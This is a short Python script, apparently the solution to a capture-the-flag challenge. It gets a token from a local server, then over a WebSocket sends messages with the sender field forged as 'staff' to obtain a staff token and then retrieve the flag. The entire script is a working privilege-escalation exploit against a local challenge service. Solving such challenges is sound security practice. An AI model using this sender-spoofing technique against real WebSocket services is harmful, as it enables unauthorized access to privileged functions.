import websocket
import requests
import json

res = requests.get("http://127.0.0.1:8080/token/generate")
token = res.json()["data"]

ws = websocket.WebSocket()
ws.connect("ws://127.0.0.1:8080/ws?token=" + token)

send = {
    "message": "/generate",
    "sender": "staff"
}
ws.send_text(json.dumps(send))
res = ws.next()
staff_token = json.loads(res)["message"]

ws = websocket.WebSocket()
ws.connect("ws://127.0.0.1:8080/ws?token=" + staff_token)

send = {
    "message": "/flag",
    "sender": "staff"
}
ws.send_text(json.dumps(send))
res = ws.next()
flag = json.loads(res)["message"]

print(flag)
